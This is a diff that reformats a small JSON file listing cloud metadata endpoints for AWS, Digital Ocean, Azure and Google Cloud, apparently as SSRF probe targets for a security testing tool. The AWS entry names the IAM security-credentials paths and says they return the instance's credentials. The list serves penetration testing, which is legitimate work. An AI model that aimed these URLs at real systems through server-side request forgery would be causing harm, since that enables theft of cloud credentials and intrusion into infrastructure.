@@ -1,35 +1,29 @@
 [
-    {
-        "id": 1,
-        "name": "AWS EC2 Metadata",
-        "description": "Return IAM role associated with the ec2 instance and the credentials",
-        "steps": [
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials",
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>/"
-        ]
-    },
-    {
-        "id": 2,
-        "name": "Digital Ocean Metadata",
-        "description": "Digital Ocean metadata",
-        "steps": [
-            "http://169.254.169.254/metadata/v1.json"
-        ]
-    },
-    {
-        "id": 3,
-        "name": "Azure Metadata",
-        "description": "Microsoft Azure Metadata",
-        "steps": [
-            "http://169.254.169.254/metadata/v1/maintenance"
-        ]
-    },
-    {
-        "id": 4,
-        "name": "Google Cloud Metadata",
-        "description": "Google Cloud Metadata | require ('X-Google-Metadata-Request: True' or 'Metadata-Flavor: Google')",
-        "steps": [
-            "http://169.254.169.254/computeMetadata/v1/"
-        ]
-    }
+  {
+    "id": 1,
+    "name": "AWS EC2 Metadata",
+    "description": "Return IAM role associated with the ec2 instance and the credentials",
+    "steps": [
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>/"
+    ]
+  },
+  {
+    "id": 2,
+    "name": "Digital Ocean Metadata",
+    "description": "Digital Ocean metadata",
+    "steps": ["http://169.254.169.254/metadata/v1.json"]
+  },
+  {
+    "id": 3,
+    "name": "Azure Metadata",
+    "description": "Microsoft Azure Metadata",
+    "steps": ["http://169.254.169.254/metadata/v1/maintenance"]
+  },
+  {
+    "id": 4,
+    "name": "Google Cloud Metadata",
+    "description": "Google Cloud Metadata | require ('X-Google-Metadata-Request: True' or 'Metadata-Flavor: Google')",
+    "steps": ["http://169.254.169.254/computeMetadata/v1/"]
+  }
 ]
